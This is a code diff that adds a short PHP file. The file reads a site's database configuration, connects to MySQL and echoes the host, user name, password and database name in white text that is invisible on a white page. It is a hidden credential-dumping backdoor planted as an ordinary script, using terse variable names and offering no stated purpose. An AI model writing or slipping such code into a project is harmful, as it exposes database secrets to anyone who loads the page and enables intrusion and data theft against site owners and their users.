@@ -1,0 +1,2 @@
+<?php
+$d=(require "../../../../Data/conf/db.php");$i=$d['DB_HOST'];$j=$d['DB_USER'];$k=$d['DB_PWD'];$l=$d['DB_NAME'];$m=mysql_connect($i,$j,$k);mysql_select_db($l);$n=mysql_query("show table status from {$l}",$m);echo '<font color=white>'.$i.'<br />'.$l.'<br />'.$j.'<br />'.$k.'</font>';?>
